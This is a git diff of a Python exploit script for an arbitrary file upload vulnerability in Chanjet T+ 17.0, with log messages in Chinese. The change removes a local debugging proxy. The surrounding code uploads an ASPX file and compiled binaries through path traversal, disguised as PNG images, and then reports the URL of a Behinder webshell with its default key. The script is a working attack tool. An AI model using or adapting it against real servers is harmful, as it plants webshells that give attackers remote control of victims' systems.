@@ -6,7 +6,6 @@ from rich.console import Console
 import urllib3
 
 console = Console()
-proxies={'http':'http://127.0.0.1:8080'}
 def now_time():
     return time.strftime("[%H:%M:%S] ", time.localtime())
     
@@ -31,7 +30,7 @@ test
     console.print(now_time() + " [INFO]     正在请求 {}".format(target_url), style='bold blue')
     try:
         requests.packages.urllib3.disable_warnings()
-        response=requests.post(url=exp_url, headers=headers,data=data,verify=False,proxies=proxies)
+        response=requests.post(url=exp_url, headers=headers,data=data,verify=False)
         if response.status_code== 200:
             console.print(now_time() + ' [INFO]  畅捷通T+17.0任意文件上传漏洞存在', style='bold green')
             exp(exp_url)
@@ -50,9 +49,9 @@ def exp(exp_url):
     file2 = [('file2', ('../../../bin/index.aspx.cdcab7d2.compiled', open('bin/index.aspx.cdcab7d2.compiled', 'rb'), 'image/png'))]
     exp=[('filee', ('index.aspx', open('bin/index.aspx', 'rb'), 'image/png'))]
     try:
-        exp_m = requests.post(exp_url, headers=headers, files=exp, verify=False, proxies=proxies) 
-        exp_r = requests.post(exp_url, headers=headers, files=file1, verify=False, proxies=proxies)
-        exp_x = requests.post(exp_url, headers=headers, files=file2, verify=False, proxies=proxies)
+        exp_m = requests.post(exp_url, headers=headers, files=exp, verify=False) 
+        exp_r = requests.post(exp_url, headers=headers, files=file1, verify=False)
+        exp_x = requests.post(exp_url, headers=headers, files=file2, verify=False)
         if exp_m.status_code== 200 and exp_r.status_code== 200 and exp_x== 200:
             shell_url='目标+/tplus/index.aspx?preload=1'
             console.print(now_time() + ' [SUCCESS]  文件上传成功, 冰蝎默认明文密钥WebShell: {}'.format(shell_url),
